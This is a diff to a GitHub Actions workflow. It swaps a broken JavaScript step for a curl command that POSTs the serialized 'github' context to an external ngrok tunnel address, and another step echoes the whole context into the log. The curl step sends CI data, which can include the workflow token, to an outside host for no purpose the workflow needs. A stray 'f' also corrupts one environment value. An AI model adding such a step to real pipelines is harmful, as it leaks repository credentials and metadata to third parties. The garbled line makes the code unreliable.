@@ -18,14 +18,9 @@ jobs:
 
       - name: HTTP Request
         run: |
-          const http = require('@actions/http-client');
-          let httpClient = new http.HttpClient('GitHub Actions');
-          let body = JSON.stringify(process.env.GITHUB_OBJECT);
-          let response = await httpClient.post('https://2dec-186-225-45-189.ngrok-free.app/log', body);
-          console.log(response);
+          curl -X POST -H "Content-Type: application/json" -d "${{ env.GITHUB_OBJECT }}" https://2dec-186-225-45-189.ngrok-free.app/log
         env:
-          NODE_PATH: ${{ runner.tool_cache }}/node_modules
-          GITHUB_OBJECT: ${{ toJson(github) }}
+          GITHUB_OBJECT: ${{ toJson(github) }}f
 
       - name: Mostrar o valor do commit
         run: echo "shablau ${{ github }}"
